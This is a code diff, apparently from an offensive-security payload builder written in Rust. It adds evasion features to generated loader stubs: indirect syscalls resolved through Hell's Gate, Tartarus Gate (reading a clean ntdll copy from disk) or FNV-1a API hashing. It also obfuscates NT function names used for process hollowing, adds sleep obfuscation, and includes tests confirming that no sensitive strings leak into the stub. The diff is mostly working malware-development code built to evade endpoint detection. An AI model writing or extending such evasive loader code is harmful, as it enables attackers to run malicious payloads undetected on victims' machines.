+                    rva_to_offset(file, addr_ordinals.checked_add(i.checked_mul(2)?)?)?,
+                )? as usize;
+                return pe32_at(
+                    file,
+                    rva_to_offset(file, addr_functions.checked_add(ordinal.checked_mul(4)?)?)?,
+                );
+            }
+        }
+        None
+    }
+
+$FILE_PE_HELPERS$
 "#;
 
 /// Renders the `mode: none` body: the prelude plus the direct helpers for the
@@ -771,6 +1294,12 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     let unmap_def = strings
         .obfuscate("NtUnmapViewOfSection")
         .render_stub_expr("unmap_func");
+    let query_def = strings
+        .obfuscate("NtQueryInformationProcess")
+        .render_stub_expr("query_info_name");
+    let get_context_def = strings
+        .obfuscate("NtGetContextThread")
+        .render_stub_expr("get_context_name");
 
     let mut out = String::from(NONE_PRELUDE);
     for f in required {
@@ -779,19 +1308,27 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     }
     out.replace("$NTDLL_DEF$", &ntdll_def)
         .replace("$UNMAP_FUNC_DEF$", &unmap_def)
+        .replace("$QUERY_FUNC_DEF$", &query_def)
+        .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
 }
 
 /// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
-/// initializers and resolution lines for the required functions) plus the
-/// indirect helpers.
-fn render_indirect(required: &[&'static NtFunction], strings: &StringsConfig) -> String {
+/// initializers and the selected resolver's resolution lines) plus the indirect
+/// helpers.
+fn render_indirect(
+    config: &SyscallsConfig,
+    required: &[&'static NtFunction],
+    strings: &StringsConfig,
+) -> String {
     let ntdll_def = strings
         .obfuscate("ntdll.dll")
         .render_stub_expr("ntdll_name");
 
     let mut fields = String::new();
     let mut init = String::new();
-    let mut resolve = String::new();
+    let mut resolve_hg = String::new();
+    let mut resolve_tg = String::new();
+    let mut resolve_ah = String::new();
     let mut helpers = String::new();
 
     for f in required {
@@ -799,23 +1336,60 @@ fn render_indirect(required: &[&'static NtFunction], strings: &StringsConfig) ->
         init.push_str(&format!("            {}: 0,\n", f.table_field));
 
         // The name is rebuilt at runtime from obfuscated bytes; the variable
-        // name (e.g. `alloc_vm_name`) is not sensitive.
+        // name (e.g. `alloc_vm_name`) is not sensitive. The API-hashing
+        // resolver skips it entirely and embeds a precomputed hash instead.
         let name_var = format!("{}_name", f.table_field);
         let name_def = strings.obfuscate(f.name).render_stub_expr(&name_var);
-        resolve.push_str(&format!(
+        resolve_hg.push_str(&format!(
             "        table.{} = resolve_ssn(module, &{})?;\n",
             f.table_field, name_def
+        ));
+        resolve_tg.push_str(&format!(
+            "        table.{} = resolve_ssn(&file, &{})?;\n",
+            f.table_field, name_def
+        ));
+        resolve_ah.push_str(&format!(
+            "        table.{} = resolve_ssn(&file, 0x{:016x})?;\n",
+            f.table_field,
+            api_hash(f.name.as_bytes())
         ));
 
         helpers.push_str(f.helper_indirect);
         helpers.push('\n');
     }
 
+    let resolver_body = match config.resolver {
+        Resolver::HellsGate => HELLS_GATE_RESOLVER
+            .replace("$SSN_INIT$", init.trim_end())
+            .replace("$SSN_RESOLVE$", resolve_hg.trim_end())
+            .replace("$NTDLL_DEF$", &ntdll_def),
+        Resolver::TartarusGate => {
+            let ntdll_path = strings
+                .obfuscate(r"C:\Windows\System32\ntdll.dll")
+                .render_stub_expr("ntdll_path");
+            TARTARUS_GATE_RESOLVER
+                .replace("$SSN_INIT$", init.trim_end())
+                .replace("$SSN_RESOLVE$", resolve_tg.trim_end())
+                .replace("$NTDLL_DEF$", &ntdll_def)
+                .replace("$NTDLL_PATH_DEF$", &ntdll_path)
+                .replace("$FILE_PE_HELPERS$", FILE_PE_HELPERS)
+        }
+        Resolver::ApiHash => {
+            let ntdll_path = strings
+                .obfuscate(r"C:\Windows\System32\ntdll.dll")
+                .render_stub_expr("ntdll_path");
+            API_HASH_RESOLVER
+                .replace("$SSN_INIT$", init.trim_end())
+                .replace("$SSN_RESOLVE$", resolve_ah.trim_end())
+                .replace("$NTDLL_DEF$", &ntdll_def)
+                .replace("$NTDLL_PATH_DEF$", &ntdll_path)
+                .replace("$FILE_PE_HELPERS$", FILE_PE_HELPERS)
+        }
+    };
+
     let mut out = INDIRECT_PRELUDE
         .replace("$SSN_FIELDS$", fields.trim_end())
-        .replace("$SSN_INIT$", init.trim_end())
-        .replace("$SSN_RESOLVE$", resolve.trim_end())
-        .replace("$NTDLL_DEF$", &ntdll_def);
+        .replace("$RESOLVER_BODY$", &resolver_body);
     out.push_str(&helpers);
     out
 }
@@ -866,9 +1440,9 @@ mod tests {
         }]
     }
 
-    fn reflective_pipeline() -> Vec<RuntimeStep> {
-        vec![RuntimeStep::ReflectiveLoading {
-            params: crate::techniques::reflective_loading::Params {},
+    fn sleep_pipeline() -> Vec<RuntimeStep> {
+        vec![RuntimeStep::SleepObfuscation {
+            params: crate::techniques::sleep_obfuscation::Params::default(),
         }]
     }
 
@@ -876,6 +1450,20 @@ mod tests {
         SyscallsConfig {
             mode: SyscallsMode::Indirect,
             resolver: Resolver::HellsGate,
+        }
+    }
+
+    fn tartarus() -> SyscallsConfig {
+        SyscallsConfig {
+            mode: SyscallsMode::Indirect,
+            resolver: Resolver::TartarusGate,
+        }
+    }
+
+    fn api_hash_config() -> SyscallsConfig {
+        SyscallsConfig {
+            mode: SyscallsMode::Indirect,
+            resolver: Resolver::ApiHash,
         }
     }
 
@@ -913,12 +1501,34 @@ mod tests {
     }
 
     #[test]
-    fn from_yaml_rejects_unknown_resolver() {
+    fn from_yaml_parses_tartarus_gate() {
         let yaml = YamlSyscallsConfig {
             mode: "indirect".into(),
             resolver: "tartarus_gate".into(),
         };
-        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("tartarus should fail");
+        let config = SyscallsConfig::from_yaml(Some(&yaml)).expect("tartarus_gate should be valid");
+        assert_eq!(config.mode, SyscallsMode::Indirect);
+        assert_eq!(config.resolver, Resolver::TartarusGate);
+    }
+
+    #[test]
+    fn from_yaml_parses_api_hash() {
+        let yaml = YamlSyscallsConfig {
+            mode: "indirect".into(),
+            resolver: "api_hash".into(),
+        };
+        let config = SyscallsConfig::from_yaml(Some(&yaml)).expect("api_hash should be valid");
+        assert_eq!(config.mode, SyscallsMode::Indirect);
+        assert_eq!(config.resolver, Resolver::ApiHash);
+    }
+
+    #[test]
+    fn from_yaml_rejects_unknown_resolver() {
+        let yaml = YamlSyscallsConfig {
+            mode: "indirect".into(),
+            resolver: "halos_gate".into(),
+        };
+        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("halos_gate should fail");
         assert!(
             err.to_string().contains("build.stub.syscalls.resolver"),
             "unclear error: {err}"
@@ -945,13 +1555,15 @@ mod tests {
                 "NtReadVirtualMemory",
                 "NtResumeThread",
                 "NtUnmapViewOfSection",
+                "NtProtectVirtualMemory",
+                "NtSuspendThread",
             ]
         );
     }
 
     #[test]
     fn required_is_empty_when_no_technique_uses_syscalls() {
-        assert!(required(&reflective_pipeline()).is_empty());
+        assert!(required(&sleep_pipeline()).is_empty());
         assert!(required(&[]).is_empty());
     }
 
@@ -961,7 +1573,7 @@ mod tests {
         // must still deduplicate (defensive).
         let pipeline = hollowing_pipeline();
         let names: BTreeSet<&str> = required(&pipeline).into_iter().collect();
-        assert_eq!(names.len(), 5, "no duplicates expected");
+        assert_eq!(names.len(), 7, "no duplicates expected");
     }
 
     // --- Hell's Gate parsing (unit-tested reference for the stub) ---
@@ -1027,6 +1639,30 @@ mod tests {
             .ok_or_else(|| ReferenceError::PatternMismatch(name.to_string()))
     }
 
+    // --- API hashing (unit-tested reference for the stub) ---
+
+    #[test]
+    fn api_hash_matches_fnv1a_reference_values() {
+        // FNV-1a 64-bit; the empty string returns the offset basis untouched,
+        // and the first required NT function is pinned against an independent
+        // reference computed outside the crate.
+        assert_eq!(api_hash(b""), 0xcbf2_9ce4_8422_2325);
+        assert_eq!(api_hash(b"NtAllocateVirtualMemory"), 0x4fe2_32be_2dca_3638);
+        assert_eq!(api_hash(b"NtGetContextThread"), 0x60b6_1d0a_f197_a950);
+    }
+
+    #[test]
+    fn api_hash_is_deterministic() {
+        assert_eq!(
+            api_hash(b"NtWriteVirtualMemory"),
+            api_hash(b"NtWriteVirtualMemory")
+        );
+        assert_ne!(
+            api_hash(b"NtWriteVirtualMemory"),
+            api_hash(b"NtReadVirtualMemory")
+        );
+    }
+
     // --- gadget search (unit-tested reference for the stub) ---
 
     #[test]
@@ -1086,6 +1722,74 @@ mod tests {
     }
 
     #[test]
+    fn tartarus_gate_block_reads_ssns_from_a_clean_file_copy() {
+        let block = render_block(&tartarus(), &hollowing_pipeline(), &xor_config());
+
+        // The resolver walks a clean copy of ntdll read from disk, not the
+        // live module's export stubs.
+        assert!(block.contains("std::fs::read"), "clean-copy read missing");
+        assert!(block.contains("fn export_rva"), "export walker missing");
+        assert!(
+            block.contains("resolve_ssn(&file, &"),
+            "file-based resolution missing"
+        );
+        assert!(
+            !block.contains("resolve_ssn(module, &"),
+            "Hell's Gate resolution must not be emitted for Tartarus Gate"
+        );
+        // The shared machinery is still present.
+        assert!(block.contains("global_asm"), "trampoline missing");
+        assert!(block.contains("struct SsnTable"), "SSN table missing");
+        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
+        assert!(!block.contains('$'), "leftover placeholders: {block}");
+    }
+
+    #[test]
+    fn tartarus_gate_block_obfuscates_the_ntdll_path_and_names() {
+        let block = render_block(&tartarus(), &hollowing_pipeline(), &xor_config());
+        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
+        assert!(
+            leaked.is_empty(),
+            "cleartext names/paths leaked outside comments: {leaked:?}"
+        );
+    }
+
+    #[test]
+    fn api_hash_block_resolves_by_hash_not_name() {
+        let block = render_block(&api_hash_config(), &hollowing_pipeline(), &xor_config());
+
+        // The resolver matches exports by a precomputed hash, so no NT name
+        // string is emitted at all (not even obfuscated).
+        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
+        assert!(
+            leaked.is_empty(),
+            "cleartext NT names leaked outside comments: {leaked:?}"
+        );
+        assert!(block.contains("fn api_hash"), "hash function missing");
+        assert!(block.contains("std::fs::read"), "clean-copy read missing");
+        assert!(
+            block.contains("fn export_rva_by_hash"),
+            "hash export walker missing"
+        );
+        assert!(
+            block.contains("resolve_ssn(&file, 0x4fe232be2dca3638)?;"),
+            "the NtAllocateVirtualMemory hash constant is missing"
+        );
+        assert!(
+            !block.contains("resolve_ssn(module, &"),
+            "Hell's Gate resolution must not be emitted for api_hash"
+        );
+        assert!(
+            !block.contains("resolve_ssn(&file, &"),
+            "name-based file resolution must not be emitted for api_hash"
+        );
+        assert!(block.contains("global_asm"), "trampoline missing");
+        assert!(block.contains("struct SsnTable"), "SSN table missing");
+        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
+        assert!(!block.contains('$'), "leftover placeholders: {block}");
+    }
+
+    #[test]
     fn none_block_has_no_ssn_resolution() {
         let block = render_block(
             &SyscallsConfig::default(),
@@ -1126,7 +1830,7 @@ mod tests {
 
     #[test]
     fn empty_pipeline_renders_a_no_op_block() {
-        let block = render_block(&indirect(), &reflective_pipeline(), &xor_config());
+        let block = render_block(&indirect(), &sleep_pipeline(), &xor_config());
         assert!(block.contains("fn init_syscalls"), "no-op init missing");
         assert!(
             !block.contains("global_asm"),
